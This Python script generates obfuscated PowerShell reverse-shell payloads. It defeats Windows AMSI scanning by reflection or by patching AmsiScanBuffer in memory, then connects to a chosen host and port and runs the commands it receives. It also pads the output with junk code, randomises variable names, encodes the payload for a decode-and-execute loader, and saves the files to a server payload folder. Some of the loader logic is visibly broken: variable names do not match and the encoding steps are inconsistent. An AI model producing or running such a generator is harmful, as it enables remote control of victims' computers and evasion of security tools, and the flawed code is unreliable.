import random
import string
import os
from datetime import datetime

def rand_name(length=None):
    length = length or random.randint(6, 12)
    return ''.join(random.choices(string.ascii_letters, k=length))

def split_string(s):
    # Splits a string into a "+"-joined sequence for obfuscation
    return '+'.join([f"'{c}'" for c in s])

def random_whitespace():
    return ' ' * random.randint(1, 4) + '\t' * random.randint(0, 2)

def junk_code():
    # Random junk code: no-ops, weird variables, etc.
    j = [
        f"${rand_name()} = {random.randint(1,100)}",
        f"#{rand_name()}_{random.randint(1000,9999)}",
        f"$null = {random.randint(0,1)}",
        f"${rand_name()} = '{rand_name(3)}'",
        f"# {rand_name(4)}"
    ]
    return random.choice(j) + random_whitespace()

def amsi_bypass_variants(var):
    # Returns a list of AMSI bypass options to randomly choose from
    variant1 = (
        f"{junk_code()}"
        f"${var['amsi_type']} = {split_string('AMSI')}\n"
        f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
        f"+${var['amsi_type']}+{split_string('Utils')})\n"
        f"${var['amsi_failed']} = ${{{var['amsi_field']}}}.GetField(${{{var['amsi_type']}}}+{split_string('InitFailed')},'NonPublic,Static')\n"
        f"${var['amsi_failed']}.SetValue($null,$true)"
    )

    variant2 = (
        f"{junk_code()}"
        "[Ref].Assembly.GetType(" + split_string("System.Management.Automation.AmsiUtils") + ")."
        "GetField(" + split_string("amsiInitFailed") + ", 'NonPublic,Static').SetValue($null, $true)"
    )

    variant3 = (
        f"{junk_code()}"
        "$w = @'\nusing System;\nusing System.Runtime.InteropServices;\n"
        "public class Win32 {\n"
        "[DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n"
        "[DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name);\n"
        "[DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n"
        "}\n'@\n"
        "Add-Type $w\n"
        "$a = [Win32]::GetProcAddress([Win32]::LoadLibrary('amsi.dll'), 'AmsiScanBuffer')\n"
        "[Win32]::VirtualProtect($a, [UIntPtr]5, 0x40, [ref]0) | Out-Null\n"
        "[Byte[]]$p = 0xB8,0x57,0x00,0x07,0x80\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 5)"
    )
    return [variant1, variant2, variant3]

def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
    # Randomized variable names
    var = {k: rand_name() for k in [
        "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
        "sendback2", "sendbyte", "encoding", "outstr"
    ]}

    # Randomly select an AMSI bypass
    amsi_bypass = random.choice(amsi_bypass_variants(var))

    # The actual reverse shell (inner payload), heavily obfuscated
    core_shell = f"""
{junk_code()}
${var['tcpclient']}={random_whitespace()}New-Object {split_string('System.Net.Sockets.TCPClient')}('{host}',{port})
{junk_code()}
${var['stream']}=${{{var['tcpclient']}}}.GetStream(){random_whitespace()}
${var['bytes']}=0..65535|%{{0}}
while((${{var['i']}}=${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)){random_whitespace()}-ne 0){{
    ${var['data']}=(New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})
    ${var['sendback']}=(iex ${{{var['data']}}} 2>&1 | Out-String)
    ${var['sendback2']}=${{{var['sendback']}}} + "PS " + (pwd).Path + "> "
    ${var['sendbyte']}=([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})
    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)
    ${{{var['stream']}}}.Flush()
    {junk_code()}
}}
{junk_code()}
""".strip()

    # Base64 encode the core shell, so the outer loader only runs: decode + IEX
    core_shell_bytes = core_shell.encode('utf-8')
    core_shell_b64 = core_shell_bytes.hex() if random.choice([True, False]) else core_shell_bytes
    if isinstance(core_shell_b64, bytes):
        import base64
        core_shell_b64 = base64.b64encode(core_shell_bytes).decode()

    loader_type = random.choice(["base64", "hex"])
    if loader_type == "base64":
        loader = f"""
{amsi_bypass}
{junk_code()}
${rand_name()} = '{core_shell_b64}'
{junk_code()}
IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${rand_name()})))
"""
    else:
        # hex encoded loader
        loader = f"""
{amsi_bypass}
{junk_code()}
${rand_name()} = '{core_shell_bytes.hex()}'
{junk_code()}
IEX ([Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromHexString(${rand_name()}))))))))
"""

    ps = loader.strip()

    if write_file:
        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
        os.makedirs(folder, exist_ok=True)
        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        path = os.path.join(folder, filename)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(ps)
        return filename
    else:
        return ps

# Alias for compatibility
generate_polymorphic_ps = generate_obfuscated_ps
